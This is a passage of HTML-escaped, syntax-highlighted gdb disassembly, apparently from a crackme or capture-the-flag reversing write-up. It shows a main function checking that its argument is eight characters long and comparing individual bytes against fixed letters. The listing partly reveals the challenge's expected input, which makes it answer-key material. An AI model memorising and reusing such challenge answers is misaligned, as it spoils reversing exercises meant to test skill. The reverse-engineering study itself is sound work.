+&lt;span class=&quot;mh&quot;&gt;0x0000000000000960&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000964&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa6b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;332&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000096a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000096e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000972&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000975&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000978&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x610&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000097d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000981&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;je&lt;/span&gt;     &lt;span class=&quot;mh&quot;&gt;0x9a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000983&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000988&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1f2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb81&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000098f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000994&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000000999&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000000099e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa8c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009a7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009ae&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;143&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009b2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;147&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;movzx&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009b5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x65&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009b7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa4e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009bd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;158&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009c1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;162&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009c5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;166&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009c8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;169&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;173&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;movzx&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009cf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;176&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009d1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;178&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa4e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009d3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;180&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009d7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;184&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;188&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009de&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;191&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009e2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;movzx&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009e5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;198&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009e7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa4e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009e9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;202&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009ed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;206&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009f1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;210&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009f4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;213&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009f8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;217&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;movzx&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009fb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;220&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000000009fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;222&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0xa4e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
